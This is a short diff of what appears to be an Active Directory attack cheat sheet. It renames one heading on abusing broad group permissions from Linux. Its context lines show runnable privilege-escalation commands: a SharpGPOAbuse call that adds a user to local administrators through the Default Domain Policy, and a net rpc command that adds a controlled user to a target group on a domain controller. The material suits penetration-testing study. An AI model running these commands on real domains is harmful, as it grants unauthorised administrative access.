@@ -210,7 +210,7 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
-#### Linux Abuse of Genric All Permission Over Group
+#### Linux Abuse of Over large Permission Over Group
 Add the user to the target group
 ```
 net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
